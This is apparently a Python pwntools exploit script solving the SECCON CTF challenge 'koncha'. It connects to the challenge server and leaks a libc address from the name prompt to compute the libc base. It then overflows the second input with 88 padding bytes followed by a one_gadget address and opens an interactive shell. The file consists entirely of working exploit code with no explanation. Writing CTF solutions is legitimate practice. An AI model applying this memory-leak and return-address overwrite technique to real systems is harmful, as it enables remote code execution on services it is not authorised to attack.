from pwn import *
import sys

elf = ELF("chall")
libc = ELF("../lib/libc.so.6")

# io = process(elf.path, env = {"LD_PRELOAD":"../lib/libc.so.6"})
io = remote("koncha.seccon.games", 9001)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

io.recvuntil(b"name?\n")
io.send(b"\n")
io.recvuntil(b"Nice to meet you, ")
r = io.recv(6)
r = r + b"\x00\x00"
libc.address = u64(r) - 2036456
print("libc addr: " + str(hex(libc.address)))

io.recvuntil(b"live in?\n")
p = b"A" * 8 * 11
p += p64(libc.address + 0xe3b01)

io.sendline(p)

io.interactive()